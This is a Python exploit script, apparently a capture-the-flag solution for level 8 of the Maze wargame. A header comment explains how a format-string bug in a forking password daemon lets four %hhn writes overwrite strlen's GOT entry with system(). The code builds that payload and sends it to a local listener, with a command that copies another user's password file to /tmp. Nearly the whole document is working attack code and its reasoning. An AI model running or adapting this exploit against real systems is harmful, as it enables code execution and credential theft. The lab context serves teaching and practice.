# Maze L8 exploit: format string in the maze8 network password daemon.
#
# /maze/maze8 31337 forks a listener; each child recv's 0x1ff bytes into a
# stack buffer, then calls snprintf(errbuf, 0x200, INPUT) -- the INPUT is the
# FORMAT STRING (no 4th argument). After snprintf the child calls
# strlen(errbuf), and strlen@GOT (0x0804b288) is writable (partial RELRO).
# Overwrite strlen@GOT with system@libc (ASLR off: libc base 0xf7d6d000 +
# system offset 0x53ce0) so strlen(errbuf) = system(errbuf), and errbuf starts
# with our command (the literal text is printed first, so its first line IS
# the command) -> runs as euid maze9 via the child's setreuid(euid, euid).
#
# Write mechanics: 4x %hhn writes the 4 bytes of system()'s address one byte
# per write. The printed-char counts are mod-256 deltas, SORTED by (byte -
# running_total) % 256, and the running total must include the literal text.
# Vararg mapping measured with a marker scan: argument N addresses
# buf + 4N - 536, so a pointer placed at buf offset o is vararg N = 134 + o/4.
# snprintf's %n counts are VIRTUAL (past the 512-byte truncation), and the
# payload cap is 511 bytes (the recv size).
import socket, subprocess, time, struct, sys
GOT_STRLEN = 0x0804b288
SYSTEM = 0xf7d6d000 + 0x53ce0        # libc base (ASLR off) + system offset
CMD = b"\ncat /etc/maze_pass/maze9 > /tmp/o9 2>&1;\n"
def build_payload(target):
    b = [(target >> (8*i)) & 0xff for i in range(4)]
    cur = len(CMD)                   # the printed-char total includes the text
    seq = []
    remaining = list(enumerate(b))
    while remaining:
        best = min(remaining, key=lambda w: (w[1]-cur) % 256)
        seq.append((best[1], GOT_STRLEN+best[0], (best[1]-cur) % 256))
        cur = best[1]
        remaining.remove(best)
    fmt = CMD
    offs = []
    off = 152                        # pointer slots start here (4-aligned)
    for byte, addr, delta in seq:
        k = 134 + off // 4           # vararg N for buf offset o: N = 134 + o/4
        fmt += (b"%" + str(delta).encode() + b"c" if delta else b"%c")
        fmt += b"%" + str(k).encode() + b"$hhn"
        offs.append((off, addr))
        off += 4
    p = fmt + b"\x00"
    for o, addr in offs:
        p = p.ljust(o, b"\x00") + struct.pack("<I", addr)
    assert len(p) <= 511
    return p
subprocess.Popen(["/maze/maze8", "31337"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(1)
s = socket.create_connection(("127.0.0.1", 31337), timeout=8)
s.recv(100)
s.sendall(build_payload(SYSTEM))
time.sleep(2)
s.close()
print("payload fired; result file:")

